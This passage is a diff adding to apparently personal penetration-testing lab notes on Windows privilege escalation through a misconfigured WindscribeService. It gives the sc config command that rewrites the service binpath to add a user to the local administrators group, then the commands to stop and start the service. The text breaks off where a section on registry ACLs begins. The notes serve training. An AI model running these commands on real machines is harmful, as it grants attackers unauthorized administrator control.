@@ -77,3 +77,22 @@ WindscribeService
   RW NT AUTHORITY\Authenticated Users
         SERVICE_ALL_ACCESS
 ```
+
+Then, we can use the binpath modification method mentioned in [[Privilege Escalation with Built-In Groups]] to modify it's binpath to a command that give us administrator or other payload we want:
+```
+C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
+
+[SC] ChangeServiceConfig SUCCESS
+```
+
+Then, we stop and start the service:
+```
+sc stop WindscribeService
+sc start WindscribeService
+```
+
+Like mentioned previously, this service is gonna get screwed by us because we changed the binpath, confirm if it is service critical before action.
+
+Checking for Permissive Registry ACLs and Modifiable Autorun Binary:
+
+We can check for weak service ACL in Window Regi
